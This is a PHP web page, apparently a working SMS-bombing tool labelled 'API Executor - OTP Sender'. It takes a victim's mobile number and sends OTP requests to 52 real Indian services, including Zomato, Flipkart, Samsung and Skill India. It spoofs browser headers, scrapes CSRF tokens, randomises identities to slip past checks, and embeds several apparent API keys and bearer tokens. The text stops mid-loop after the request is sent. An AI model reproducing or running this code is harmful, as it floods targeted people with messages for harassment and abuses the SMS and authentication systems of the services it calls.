<!DOCTYPE html>
<html>
<head>
    <title>API Executor</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        h1 { color: #333; }
        .api-result { 
            border: 1px solid #ddd; 
            padding: 10px; 
            margin: 10px 0; 
            border-radius: 5px;
            background-color: #f9f9f9;
        }
        .success { color: green; }
        .error { color: red; }
        .api-name { font-weight: bold; color: #0066cc; }
    </style>
</head>
<body>
    <h1>API Executor - OTP Sender</h1>
    <form method="get" action="">
        <label for="mobile">Enter Mobile Number:</label>
        <input type="text" id="mobile" name="mobile" required placeholder="9876543210" pattern="[0-9]{10}">
        <button type="submit">Submit</button>
    </form>

    <?php
    if (isset($_GET['mobile'])) {
        $mobile = htmlspecialchars($_GET['mobile']);
        
        // Common headers
        $common_headers = [
            "Content-Type: application/json; charset=utf-8",
            "User-Agent: Mozilla/5.0 (Linux; Android 11; RMX2001) AppleWebKit/537.36"
        ];
        
        $apis = [
            // [01] RiGi OTP
            [
                "name" => "01. RiGi OTP",
                "url" => "https://api.rigi.club/api/account/sendotp",
                "headers" => [
                    "Content-Type: application/json",
                    "origin: https://rpy.club",
                    "referer: https://rpy.club/",
                    "User-Agent: Mozilla/5.0"
                ],
                "data" => json_encode(["p_n" => "+91" . $mobile, "countryCode" => "91"])
            ],
            
            // [02] POLiCYBOSS OTP
            [
                "name" => "02. POLiCYBOSS OTP",
                "url" => "https://horizon.policyboss.com:5443/generateOTP_New/" . $mobile . "/POSP-INQUIRY/NA/NA/NA",
                "headers" => [
                    "origin: https://www.policyboss.com",
                    "referer: https://www.policyboss.com/"
                ],
                "data" => null,
                "method" => "GET"
            ],
            
            // [03] SNITCH OTP
            [
                "name" => "03. SNITCH OTP",
                "url" => "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2",
                "headers" => [
                    "client-id: snitch_secret",
                    "Content-Type: application/json"
                ],
                "data" => json_encode(["mobile_number" => "+91" . $mobile])
            ],
            
            // [04] SOLVEZY OTP
            [
                "name" => "04. SOLVEZY OTP",
                "url" => "https://apis.solvezy.com/wauth/user-onboarding/api/v1/otp/send",
                "headers" => $common_headers,
                "data" => json_encode(["mobile" => "+91" . $mobile])
            ],
            
            // [05] TVS OTP
            [
                "name" => "05. TVS OTP",
                "url" => "https://www.tvsmotor.com/api/Ecommerce/RegisterUser",
                "headers" => [
                    "Content-Type: application/x-www-form-urlencoded"
                ],
                "data" => http_build_query([
                    "FullName" => "Test",
                    "Email" => "a@b.com",
                    "CityId" => "200",
                    "Picture" => "7020636",
                    "MobileNumber" => $mobile,
                    "Otp" => "",
                    "Locale" => "R"
                ])
            ],
            
            // [06] RELIANCE OTP
            [
                "name" => "06. RELIANCE OTP",
                "url" => "https://www.reliancedigital.in/ext/raven-api/register/send/otp/mobile",
                "headers" => array_merge($common_headers, [
                    "origin: https://www.reliancedigital.in",
                    "x-requested-with: pure.lite.browser",
                    "x-fp-date: " . gmdate('Ymd\THis\Z'),
                    "x-fp-signature: v1.1:" . hash_hmac('sha256', gmdate('Ymd\THis\Z'), 'secret_key')
                ]),
                "data" => json_encode(["mobile" => $mobile, "country_code" => "91"])
            ],
            
            // [07] SAMSUNG OTP
            [
                "name" => "07. SAMSUNG OTP",
                "url" => "https://www.samsung.com/in/api/v1/sso/otp/init",
                "headers" => array_merge($common_headers, [
                    "origin: https://www.samsung.com",
                    "referer: https://www.samsung.com/in/web/login"
                ]),
                "data" => json_encode(["user_id" => $mobile])
            ],
            
            // [08] VAKILSEARCH OTP
            [
                "name" => "08. VAKILSEARCH OTP",
                "url" => "https://libra.vakilsearch.com/login_using_otp",
                "headers" => [
                    "x-csrf-token: [TOKEN_WILL_BE_GENERATED]",
                    "x-requested-with: XMLHttpRequest",
                    "Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
                    "User-Agent: Mozilla/5.0 (Linux; Android 11; RMX2001)"
                ],
                "data" => "contact_number=" . $mobile,
                "requires_token" => true,
                "token_url" => "https://libra.vakilsearch.com/login"
            ],
            
            // [09] STASHFIN OTP
            [
                "name" => "09. STASHFIN OTP",
                "url" => "https://api.stashfin.com/v3/onboarding/send-otp",
                "headers" => $common_headers,
                "data" => json_encode(["phone" => $mobile])
            ],
            
            // [10] ZEE5 OTP
            [
                "name" => "10. ZEE5 OTP",
                "url" => "https://auth.zee5.com/v1/user/sendotp",
                "headers" => array_merge($common_headers, [
                    "Host: auth.zee5.com",
                    "x-z5-guest-token: 1bfd922e-6edd-4204-a0aa-2ac32a70b026",
                    "origin: https://www.zee5.com",
                    "x-requested-with: pure.lite.browser",
                    "referer: https://www.zee5.com/"
                ]),
                "data" => json_encode(["phoneno" => "91" . $mobile])
            ],
            
            // [11] CLINN OTP
            [
                "name" => "11. CLINN OTP",
                "url" => "https://gatewayprod.clinn.in/api/authenticate/sendOtp?mobileNo=" . $mobile,
                "headers" => $common_headers,
                "data" => null,
                "method" => "POST"
            ],
            
            // [12] POCKETFM OTP
            [
                "name" => "12. POCKETFM OTP",
                "url" => "https://internalapi.pocketfm.com/v2/user_api/user.send_otp?is_novel=1",
                "headers" => $common_headers,
                "data" => json_encode(["phone_number" => "+91" . $mobile, "channel" => null])
            ],
            
            // [13] SKILLBEE OTP
            [
                "name" => "13. SKILLBEE OTP",
                "url" => "https://employer.skillbee.com/api/v1/user/send-otp",
                "headers" => array_merge($common_headers, [
                    "Host: employer.skillbee.com",
                    "origin: https://employer.skillbee.com",
                    "referer: https://employer.skillbee.com/register/send-otp"
                ]),
                "data" => json_encode([
                    "countryCode" => "+91",
                    "phone" => $mobile,
                    "type" => "HIRING MANAGER",
                    "method" => "TEXT",
                    "ipv4" => "157.34.87.85",
                    "fingerprint" => "9ae1a4fa095c261f08f1905ca9fb3077"
                ])
            ],
            
            // [14] MEDKART OTP
            [
                "name" => "14. MEDKART OTP",
                "url" => "https://app.medkart.in/api/v2/auth/request-otp?identifier=a98e86244130e",
                "headers" => array_merge($common_headers, [
                    "Host: app.medkart.in",
                    "authorization: Bearer",
                    "origin: https://www.medkart.in",
                    "referer: https://www.medkart.in/"
                ]),
                "data" => json_encode(["mobile_no" => $mobile])
            ],
            
            // [15] TRACTORJUNCTION OTP
            [
                "name" => "15. TRACTORJUNCTION OTP",
                "url" => "https://www.tractorjunction.com/ajax/send-otp/?mobile=" . $mobile,
                "headers" => [
                    "User-Agent: Mozilla/5.0 (Linux; Android 11; RMX2001)",
                    "x-requested-with: XMLHttpRequest",
                    "referer: https://www.tractorjunction.com/login/",
                    "X-XSRF-TOKEN: [TOKEN_WILL_BE_GENERATED]"
                ],
                "data" => null,
                "method" => "GET",
                "requires_token" => true,
                "token_url" => "https://www.tractorjunction.com/login/"
            ],
            
            // [16] ZENO OTP
            [
                "name" => "16. ZENO OTP",
                "url" => "https://ecom.zeno.health/api/auth-service/v1/users-otp/generate-otp",
                "headers" => array_merge($common_headers, [
                    "Host: ecom.zeno.health",
                    "authorization: Bearer HRV5enFBCB65w75XA1zrdynsYew07J",
                    "platform: mobile-web",
                    "origin: https://www.zeno.health",
                    "referer: https://www.zeno.health/"
                ]),
                "data" => json_encode(["phone" => $mobile])
            ],
            
            // [17] ONFERENCE OTP
            [
                "name" => "17. ONFERENCE OTP",
                "url" => "https://onference.in/api/send-otp",
                "headers" => array_merge($common_headers, [
                    "Host: onference.in",
                    "x-requested-with: XMLHttpRequest",
                    "origin: https://onference.in",
                    "referer: https://onference.in/login-otp?"
                ]),
                "data" => http_build_query([
                    "fullname" => substr(str_shuffle("abcdefghijklmnopqrstuvwxyz"), 0, 6),
                    "mobileno" => $mobile,
                    "countrycode" => "91",
                    "attempt" => rand(1, 100)
                ])
            ],
            
            // [18] PRISTINECARE OTP
            [
                "name" => "18. PRISTINECARE OTP",
                "url" => "https://pristinecare.net/api-build/sendOTP",
                "headers" => array_merge($common_headers, [
                    "Host: pristinecare.net",
                    "origin: https://www.beatxp.com",
                    "x-requested-with: pure.lite.browser",
                    "referer: https://www.beatxp.com/"
                ]),
                "data" => json_encode(["number" => $mobile])
            ],
            
            // [19] ZOMATO OTP
            [
                "name" => "19. ZOMATO OTP",
                "url" => "https://accounts.zomato.com/login/phone",
                "headers" => [
                    "Content-Type: application/x-www-form-urlencoded",
                    "User-Agent: Mozilla/5.0",
                    "Origin: https://accounts.zomato.com",
                    "Referer: https://accounts.zomato.com/zoauth/login",
                    "Cookie: csrf=b3d6d90b40497cd6f712a3e782cba4b0"
                ],
                "data" => http_build_query([
                    "country_id" => "1",
                    "number" => $mobile,
                    "type" => "initiate",
                    "csrf_token" => "b3d6d90b40497cd6f712a3e782cba4b0",
                    "lc" => "eec266562d784393892d541f2e841b42",
                    "verification_type" => "sms"
                ])
            ],
            
            // [20] SHIPROCKET OTP
            [
                "name" => "20. SHIPROCKET OTP",
                "url" => "https://apiv2.shiprocket.co/v1/auth/register/mobile/request-otp",
                "headers" => array_merge($common_headers, [
                    "no-auth: True",
                    "origin: https://app.shiprocket.in",
                    "referer: https://app.shiprocket.in/"
                ]),
                "data" => json_encode(["mobile" => $mobile])
            ],
            
            // [21] MEDDO OTP
            [
                "name" => "21. MEDDO OTP",
                "url" => "https://patient.api.meddo.in/api/v1/auth/meddo/sendOTP?mobileNo=" . $mobile,
                "headers" => array_merge($common_headers, [
                    "Host: patient.api.meddo.in",
                    "origin: https://meddo.in",
                    "x-requested-with: pure.lite.browser",
                    "referer: https://meddo.in/"
                ]),
                "data" => null,
                "method" => "GET"
            ],
            
            // [22] DEZERV OTP
            [
                "name" => "22. DEZERV OTP",
                "url" => "https://nexus.dezerv.in/app-server/v1/send-new-invite",
                "headers" => array_merge($common_headers, [
                    "x-client-app: mobile_web",
                    "origin: https://www.dezerv.in",
                    "referer: https://www.dezerv.in/"
                ]),
                "data" => json_encode([
                    "phone" => $mobile,
                    "isWhatsappOtp" => false,
                    "whatsappOptIn" => true,
                    "executionIdForConsent" => "",
                    "webChannel" => "organic"
                ])
            ],
            
            // [23] UDCHALO OTP
            [
                "name" => "23. UDCHALO OTP",
                "url" => "https://prod-server.udchalo.com/api/user/sendOtpForLoginV2",
                "headers" => array_merge($common_headers, [
                    "origin: https://www.udchalo.com",
                    "referer: https://www.udchalo.com/"
                ]),
                "data" => json_encode(["field" => $mobile, "isNewVersion" => true])
            ],
            
            // [24] DISTRICT OTP
            [
                "name" => "24. DISTRICT OTP",
                "url" => "https://www.district.in/gw/auth/generate_otp",
                "headers" => array_merge($common_headers, [
                    "x-device-id: abc123",
                    "x-app-type: ed_web",
                    "x-app-version: 11.11.1",
                    "origin: https://www.district.in",
                    "referer: https://www.district.in/events/?showRedirectionPopup=true"
                ]),
                "data" => json_encode(["phone_number" => $mobile, "country_code" => "91"])
            ],
            
            // [25] MYOWNSHOP OTP
            [
                "name" => "25. MYOWNSHOP OTP",
                "url" => "https://api.cdn.myownshop.in/OTP/user?mobileNumber=" . $mobile,
                "headers" => array_merge($common_headers, [
                    "origin: https://supplier.shop101.com",
                    "referer: https://supplier.shop101.com/",
                    "x-device-type: web",
                    "x-app-version: 1.0.0"
                ]),
                "data" => null,
                "method" => "POST"
            ],
            
            // [26] CITYMALL OTP
            [
                "name" => "26. CITYMALL OTP",
                "url" => "https://seller.citymall.live/api/auth/get-otp",
                "headers" => array_merge($common_headers, [
                    "Host: seller.citymall.live",
                    "origin: https://seller.citymall.live",
                    "referer: https://seller.citymall.live/login",
                    "X-Requested-With: pure.lite.browser"
                ]),
                "data" => json_encode(["phone_number" => $mobile])
            ],
            
            // [27] NOBROKER OTP
            [
                "name" => "27. NOBROKER OTP",
                "url" => "https://www.nobroker.in/api/v3/account/otp/send",
                "headers" => [
                    "Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
                    "User-Agent: Mozilla/5.0 (Linux; Android 9; Pixel 4 Build/PQ3A.190801.002; wv) AppleWebKit/537.36",
                    "origin: https://www.nobroker.in",
                    "referer: https://www.nobroker.in/",
                    "x-requested-with: mark.via.gp"
                ],
                "data" => http_build_query([
                    "phone" => $mobile,
                    "countryCode" => "IN"
                ])
            ],
            
            // [28] UNACADEMY OTP
            [
                "name" => "28. UNACADEMY OTP",
                "url" => "https://unacademy.com/api/v3/user/user_check/?enable-email=true",
                "headers" => array_merge($common_headers, [
                    "x-platform: 7",
                    "origin: https://unacademy.com"
                ]),
                "data" => json_encode([
                    "phone" => $mobile,
                    "country_code" => "IN",
                    "otp_type" => 1,
                    "email" => "",
                    "send_otp" => true,
                    "is_un_teach_user" => false
                ])
            ],
            
            // [29] FASHINZA OTP
            [
                "name" => "29. FASHINZA OTP",
                "url" => "https://api.fashinza.com/auth/v2/generate_otp",
                "headers" => array_merge($common_headers, [
                    "Host: api.fashinza.com",
                    "origin: https://fashinza.com",
                    "referer: https://fashinza.com/",
                    "x-requested-with: pure.lite.browser"
                ]),
                "data" => json_encode([
                    "phone_number" => $mobile,
                    "country_code" => "91"
                ])
            ],
            
            // [30] VYAPARAPP OTP
            [
                "name" => "30. VYAPARAPP OTP",
                "url" => "https://vyaparapp.in/check/user",
                "headers" => [
                    "x-requested-with: XMLHttpRequest",
                    "User-Agent: Mozilla/5.0",
                    "Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
                    "origin: https://vyaparapp.in",
                    "referer: https://vyaparapp.in"
                ],
                "data" => http_build_query([
                    "_token" => "[TOKEN_WILL_BE_GENERATED]",
                    "country_code" => "91",
                    "phone" => $mobile,
                    "remaining_trial_period" => "0",
                    "firebase_otp" => "",
                    "email" => ""
                ]),
                "requires_token" => true,
                "token_url" => "https://vyaparapp.in/"
            ],
            
            // [31] APNA OTP
            [
                "name" => "31. APNA OTP",
                "url" => "https://production.apna.co/api/userprofile/v1/otp/",
                "headers" => array_merge($common_headers, [
                    "origin: https://apna.co",
                    "x-requested-with: pure.lite.browser",
                    "referer: https://apna.co/"
                ]),
                "data" => json_encode([
                    "hash_type" => "original",
                    "phone_number" => "91" . $mobile,
                    "request_id" => (string)rand(1000000000000, 9999999999999),
                    "retries" => 0
                ])
            ],
            
            // [32] NUVAMA OTP
            [
                "name" => "32. NUVAMA OTP",
                "url" => "https://nwaop.nuvamawealth.com/mwapi/api/Lead/GO",
                "headers" => array_merge($common_headers, [
                    "api-key: c41121ed-b6fb-c9a6-bc9b-574c82929e7e",
                    "origin: https://onboarding.nuvamawealth.com",
                    "referer: https://onboarding.nuvamawealth.com/"
                ]),
                "data" => json_encode([
                    "contactInfo" => $mobile,
                    "mode" => "SMS"
                ])
            ],
            
            // [33] MONEYVIEW OTP
            [
                "name" => "33. MONEYVIEW OTP",
                "url" => "https://pwa.gw.moneyview.in/uis/pwa/generate-otp",
                "headers" => [
                    "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBBzfI2o6X36yZTvF",
                    "origin: https://moneyview.in",
                    "User-Agent: Mozilla/5.0 (Linux; Android 11; RMX2001)"
                ],
                "data" => "------WebKitFormBoundaryBBzfI2o6X36yZTvF\r\n"
                      . "Content-Disposition: form-data; name=\"key\"\r\n\r\n"
                      . "MOBILE\r\n"
                      . "------WebKitFormBoundaryBBzfI2o6X36yZTvF\r\n"
                      . "Content-Disposition: form-data; name=\"mobile\"\r\n\r\n"
                      . $mobile . "\r\n"
                      . "------WebKitFormBoundaryBBzfI2o6X36yZTvF\r\n"
                      . "Content-Disposition: form-data; name=\"source\"\r\n\r\n"
                      . "pwa\r\n"
                      . "------WebKitFormBoundaryBBzfI2o6X36yZTvF--"
            ],
            
            // [34] BEEPKART OTP
            [
                "name" => "34. BEEPKART OTP",
                "url" => "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
                "headers" => array_merge($common_headers, [
                    "Host: api.beepkart.com",
                    "origin: https://www.beepkart.com",
                    "referer: https://www.beepkart.com/",
                    "x-requested-with: pure.lite.browser",
                    "appname: Website"
                ]),
                "data" => json_encode([
                    "city" => 362,
                    "fullName" => "",
                    "phone" => (int)$mobile,
                    "source" => "myaccount",
                    "location" => "",
                    "leadSourceLang" => "",
                    "platform" => "",
                    "consent" => true,
                    "whatsappConsent" => true,
                    "blockNotification" => false,
                    "utmSource" => "",
                    "utmCampaign" => "",
                    "sessionInfo" => [
                        "sessionId" => uniqid(),
                        "userId" => "0",
                        "sessionRawString" => "pathname=/account/new-landing&source=myaccount",
                        "deviceInfo" => [
                            "deviceRawString" => "cityId=362; screen=360x800; cityName=bangalore; browser_name=Chrome; browser_version=138.0.7204.45; os=Android; os_version=11; mobile=Mobile_Web; device_type=Android;",
                            "userAgent" => "Mozilla/5.0 (Linux; Android 11; RMX2001 Build/RP1A.200720.011)"
                        ]
                    ]
                ])
            ],
            
            // [35] FLIPKART OTP
            [
                "name" => "35. FLIPKART OTP",
                "url" => "https://rome.api.flipkart.com/api/7/user/otp/generate",
                "headers" => array_merge($common_headers, [
                    "Origin: https://www.flipkart.com",
                    "Referer: https://www.flipkart.com/",
                    "X-user-agent: Mozilla/5.0 FKUA/website/42/website/Desktop"
                ]),
                "data" => json_encode(["loginId" => "+91" . $mobile])
            ],
            
            // [36] FURLENCO OTP
            [
                "name" => "36. FURLENCO OTP",
                "url" => "https://ciago.furlenco.com/api/v1/users/verify-account",
                "headers" => array_merge($common_headers, [
                    "Host: ciago.furlenco.com",
                    "x-city-id: 1",
                    "x-pincode: 560114",
                    "moriarty: mweb-1.0",
                    "origin: https://www.furlenco.com",
                    "referer: https://www.furlenco.com/",
                    "x-requested-with: pure.lite.browser"
                ]),
                "data" => json_encode(["account" => $mobile])
            ],
            
            // [37] ASTROSAGE OTP
            [
                "name" => "37. ASTROSAGE OTP",
                "url" => "https://varta.astrosage.com/sdk/registerAS?callback=myCallback&regsource=AstroSage_Web&countrycode=91&phoneno=" . $mobile . "&deviceid=&jsonpcall=1&fromresend=0&operation_name=blank",
                "headers" => array_merge($common_headers, [
                    "Host: varta.astrosage.com",
                    "x-requested-with: pure.lite.browser",
                    "referer: https://www.astrosage.com/"
                ]),
                "data" => null,
                "method" => "GET"
            ],
            
            // [38] UPGRAD OTP
            [
                "name" => "38. UPGRAD OTP",
                "url" => "https://prod-auth-api.upgrad.com/apis/auth/v6/registration/initiate",
                "headers" => array_merge($common_headers, [
                    "Host: prod-auth-api.upgrad.com",
                    "origin: https://www.upgrad.com",
                    "x-requested-with: pure.lite.browser"
                ]),
                "data" => json_encode([
                    "phoneNumber" => "+91" . $mobile,
                    "otpVerificationMode" => "phone",
                    "config" => [],
                    "otpTarget" => "phone"
                ])
            ],
            
            // [39] WORKINDIA OTP
            [
                "name" => "39. WORKINDIA OTP",
                "url" => "https://api.workindia.in/api/auth/employer/check-user/",
                "headers" => array_merge($common_headers, [
                    "Host: api.workindia.in",
                    "package-name: in.workindia.employer.web",
                    "origin: https://www.workindia.in",
                    "x-requested-with: pure.lite.browser",
                    "referer: https://www.workindia.in/"
                ]),
                "data" => json_encode(["phone_no" => (int)$mobile])
            ],
            
            // [40] ZOPNOTE OTP
            [
                "name" => "40. ZOPNOTE OTP",
                "url" => "https://web.zopnote.com/signup",
                "headers" => [
                    "Host: web.zopnote.com",
                    "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryy4jJup8vy1dwzeAk",
                    "User-Agent: Mozilla/5.0 (Linux; Android 11; RMX2001)",
                    "Origin: https://web.zopnote.com",
                    "X-Requested-With: pure.lite.browser",
                    "Referer: https://web.zopnote.com/signup"
                ],
                "data" => "------WebKitFormBoundaryy4jJup8vy1dwzeAk\r\n"
                      . "Content-Disposition: form-data; name=\"1_phone\"\r\n\r\n"
                      . $mobile . "\r\n"
                      . "------WebKitFormBoundaryy4jJup8vy1dwzeAk\r\n"
                      . "Content-Disposition: form-data; name=\"1_channel\"\r\n\r\n"
                      . "sms\r\n"
                      . "------WebKitFormBoundaryy4jJup8vy1dwzeAk\r\n"
                      . "Content-Disposition: form-data; name=\"0\"\r\n\r\n"
                      . '[{"otpSend":false},"$K1"]' . "\r\n"
                      . "------WebKitFormBoundaryy4jJup8vy1dwzeAk--"
            ],
            
            // [41] RUPEE112 OTP
            [
                "name" => "41. RUPEE112 OTP",
                "url" => "https://www.rupee112.com/login-sbm",
                "headers" => [
                    "Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
                    "User-Agent: Mozilla/5.0 (Linux; Android 11; RMX2001)",
                    "Origin: https://www.rupee112.com",
                    "Referer: https://www.rupee112.com/apply-now",
                    "X-Requested-With: XMLHttpRequest"
                ],
                "data" => http_build_query([
                    "mobile" => $mobile,
                    "current_page" => "login",
                    "is_existing_customer" => "2",
                    "device_id" => uniqid()
                ])
            ],
            
            // [42] AAKASH OTP
            [
                "name" => "42. AAKASH OTP",
                "url" => "https://antheapi.aakash.ac.in/api/generate-lead-otp",
                "headers" => array_merge($common_headers, [
                    "Host: antheapi.aakash.ac.in",
                    "x-client-id: a6fbf1d2-27c3-46e1-b149-0380e506b763",
                    "origin: https://www.aakash.ac.in",
                    "referer: https://www.aakash.ac.in/"
                ]),
                "data" => json_encode([
                    "mobile_psid" => $mobile,
                    "mobile_number" => "",
                    "activity_type" => "aakash-myadmission",
                    "webengageData" => [
                        "profile" => "student",
                        "whatsapp_opt_in" => true,
                        "method" => "mobile"
                    ]
                ])
            ],
            
            // [43] PHYSICSWALLAH OTP
            [
                "name" => "43. PHYSICSWALLAH OTP",
                "url" => "https://api.penpencil.co/v1/users/register/5eb393ee95fab7468a79d189?smsType=0",
                "headers" => array_merge($common_headers, [
                    "Host: api.penpencil.co",
                    "origin: https://www.pw.live",
                    "referer: https://www.pw.live/",
                    "randomid: 60ecd9e1-3cbf-4bf0-b8cc-9d5c5d72a556"
                ]),
                "data" => json_encode([
                    "mobile" => $mobile,
                    "countryCode" => "+91",
                    "firstName" => "Deepraj",
                    "subOrgId" => "SUB-PWLI000"
                ])
            ],
            
            // [44] BLUESTAR OTP
            [
                "name" => "44. BLUESTAR OTP",
                "url" => "https://sotp-api.lucentinnovation.com/v6/otp",
                "headers" => array_merge($common_headers, [
                    "Host: sotp-api.lucentinnovation.com",
                    "shop_name: bluestarindia.myshopify.com",
                    "action: sendOTP",
                    "origin: https://consumer.bluestarindia.com",
                    "x-requested-with: pure.lite.browser",
                    "referer: https://consumer.bluestarindia.com/"
                ]),
                "data" => json_encode([
                    "username" => "+91" . $mobile,
                    "type" => "mobile",
                    "domain" => "consumer.bluestarindia.com"
                ])
            ],
            
            // [45] MYBILLBOOK OTP
            [
                "name" => "45. MYBILLBOOK OTP",
                "url" => "https://mybillbook.in/api/web/request_otp",
                "headers" => array_merge($common_headers, [
                    "Host: mybillbook.in",
                    "origin: https://mybillbook.in",
                    "referer: https://mybillbook.in/app/login?source=iframe",
                    "X-Requested-With: pure.lite.browser",
                    "Client: web"
                ]),
                "data" => json_encode([
                    "mobile_number" => $mobile,
                    "source" => "landing"
                ])
            ],
            
            // [46] ADDA52 OTP
            [
                "name" => "46. ADDA52 OTP",
                "url" => "https://gatewayapi.adda52.com/user/registration/send-otp",
                "headers" => array_merge($common_headers, [
                    "Host: gatewayapi.adda52.com",
                    "origin: https://www.adda52.com",
                    "x-requested-with: pure.lite.browser",
                    "referer: https://www.adda52.com/"
                ]),
                "data" => "user=" . $mobile . "&source=web_mobile&resend=false&reqFrom=SIGNUP"
            ],
            
            // [47] SKILL INDIA OTP
            [
                "name" => "47. SKILL INDIA OTP",
                "url" => "https://api-fe.skillindiadigital.gov.in/api/discovery-account/signup/" . base64_encode($mobile) . "/Mobilizer",
                "headers" => array_merge($common_headers, [
                    "Host: api-fe.skillindiadigital.gov.in",
                    "language: en",
                    "origin: https://www.skillindiadigital.gov.in",
                    "referer: https://www.skillindiadigital.gov.in/",
                    "x-requested-with: pure.lite.browser"
                ]),
                "data" => null,
                "method" => "GET"
            ],
            
            // [48] LEGALKART OTP
            [
                "name" => "48. LEGALKART OTP",
                "url" => "https://www.legalkart.com/api/v2/customer/register",
                "headers" => array_merge($common_headers, [
                    "Host: www.legalkart.com",
                    "origin: https://www.legalkart.com",
                    "referer: https://www.legalkart.com/consumer/",
                    "X-Requested-With: pure.lite.browser"
                ]),
                "data" => json_encode([
                    "mobile" => $mobile,
                    "country_code" => 102,
                    "device_fcm_id" => "",
                    "device" => "web"
                ])
            ],
            
            // [49] VIDYAKUL OTP
            [
                "name" => "49. VIDYAKUL OTP",
                "url" => "https://vidyakul.com/signup-otp/send",
                "headers" => [
                    "Host: vidyakul.com",
                    "x-requested-with: XMLHttpRequest",
                    "Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
                    "User-Agent: Mozilla/5.0 (Linux; Android 11; RMX2001)",
                    "origin: https://vidyakul.com",
                    "referer: https://vidyakul.com/user/my-courses"
                ],
                "data" => "phone=" . $mobile . "&rcsconsent=true"
            ],
            
            // [50] EDUGORILLA OTP
            [
                "name" => "50. EDUGORILLA OTP",
                "url" => "https://testseries.edugorilla.com/api/v2/auth/signup/st1?action=signup_verify_mobile",
                "headers" => [
                    "User-Agent: Mozilla/5.0 (Linux; Android 11; RMX2001 Build/RP1A.200720.011)",
                    "Accept: application/json, text/plain, */*",
                    "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryD4kSsaA6KK4A2N1D",
                    "Origin: https://testseries.edugorilla.com",
                    "Referer: https://testseries.edugorilla.com/signup",
                    "X-Requested-With: pure.lite.browser"
                ],
                "data" => "--" . "----WebKitFormBoundaryD4kSsaA6KK4A2N1D" . "\r\n"
                      . "Content-Disposition: form-data; name=\"full_name\"\r\n\r\n"
                      . "TestUser\r\n"
                      . "--" . "----WebKitFormBoundaryD4kSsaA6KK4A2N1D" . "\r\n"
                      . "Content-Disposition: form-data; name=\"phone\"\r\n\r\n"
                      . $mobile . "\r\n"
                      . "--" . "----WebKitFormBoundaryD4kSsaA6KK4A2N1D" . "\r\n"
                      . "Content-Disposition: form-data; name=\"email\"\r\n\r\n"
                      . "test" . time() . "@gmail.com\r\n"
                      . "--" . "----WebKitFormBoundaryD4kSsaA6KK4A2N1D" . "\r\n"
                      . "Content-Disposition: form-data; name=\"password\"\r\n\r\n"
                      . "Test@123\r\n"
                      . "--" . "----WebKitFormBoundaryD4kSsaA6KK4A2N1D" . "\r\n"
                      . "Content-Disposition: form-data; name=\"conf_pass\"\r\n\r\n"
                      . "Test@123\r\n"
                      . "--" . "----WebKitFormBoundaryD4kSsaA6KK4A2N1D" . "--"
            ],
            
            // [51] HUNGAMA OTP
            [
                "name" => "51. HUNGAMA OTP",
                "url" => "https://communication.api.hungama.com/v1/communication/otp",
                "headers" => array_merge($common_headers, [
                    "Host: communication.api.hungama.com",
                    "identifier: home",
                    "mlang: en",
                    "alang: en",
                    "country_code: IN",
                    "vlang: en",
                    "origin: https://www.hungama.com",
                    "x-requested-with: pure.lite.browser",
                    "referer: https://www.hungama.com/"
                ]),
                "data" => json_encode([
                    "mobileNo" => $mobile,
                    "countryCode" => "+91",
                    "appCode" => "un",
                    "messageId" => "1",
                    "emailId" => "",
                    "subject" => "Register",
                    "priority" => "1",
                    "device" => "web",
                    "variant" => "v1",
                    "templateCode" => 1
                ])
            ],
            
            // [52] VIROHAN OTP
            [
                "name" => "52. VIROHAN OTP",
                "url" => "https://api-website.virohan.com/getotp",
                "headers" => array_merge($common_headers, [
                    "Host: api-website.virohan.com",
                    "x-api-key: glO7twA4VA8o1swxwbwFMdhX4O5TYA",
                    "origin: https://www.virohan.com",
                    "x-requested-with: pure.lite.browser",
                    "referer: https://www.virohan.com/"
                ]),
                "data" => json_encode([
                    "mobileNumber" => $mobile,
                    "url" => "https://virohan.com",
                    "platform" => "website",
                    "origin" => "https://virohan.com",
                    "websiteType" => "new"
                ])
            ]
        ];

        echo "<h2>Results for Mobile: " . $mobile . "</h2>";
        echo "<p>Total APIs: " . count($apis) . "</p>";
        
        foreach ($apis as $api) {
            echo "<div class='api-result'>";
            echo "<p class='api-name'>" . $api['name'] . "</p>";
            
            $ch = curl_init();
            
            // Handle token-based APIs
            if (isset($api['requires_token']) && $api['requires_token']) {
                $token_ch = curl_init();
                curl_setopt($token_ch, CURLOPT_URL, $api['token_url']);
                curl_setopt($token_ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($token_ch, CURLOPT_USERAGENT, "Mozilla/5.0");
                $token_response = curl_exec($token_ch);
                
                if ($api['name'] == "08. VAKILSEARCH OTP") {
                    preg_match('/name="csrf-token" content="(.*?)"/', $token_response, $matches);
                    if (!empty($matches[1])) {
                        $token = $matches[1];
                        $api['headers'][0] = "x-csrf-token: " . $token;
                    }
                } elseif ($api['name'] == "15. TRACTORJUNCTION OTP") {
                    preg_match('/XSRF-TOKEN=([^;]+)/', $token_response, $matches);
                    if (!empty($matches[1])) {
                        $token = urldecode($matches[1]);
                        $api['headers'][3] = "X-XSRF-TOKEN: " . $token;
                    }
                } elseif ($api['name'] == "30. VYAPARAPP OTP") {
                    preg_match('/name="_token"\s+value="(.+?)"/', $token_response, $matches);
                    if (!empty($matches[1])) {
                        $token = $matches[1];
                        $api['data'] = str_replace("[TOKEN_WILL_BE_GENERATED]", $token, $api['data']);
                    }
                }
                
                curl_close($token_ch);
            }
            
            // Set curl options
            curl_setopt($ch, CURLOPT_URL, $api['url']);
            
            if (isset($api['method']) && $api['method'] == 'GET') {
                curl_setopt($ch, CURLOPT_HTTPGET, true);
            } else {
                curl_setopt($ch, CURLOPT_POST, true);
                if ($api['data']) {
                    curl_setopt($ch, CURLOPT_POSTFIELDS, $api['data']);
                }
            }
            
            curl_setopt($ch, CURLOPT_HTTPHEADER, $api['headers']);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_TIMEOUT, 30);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            
            $response = curl_exec($ch);
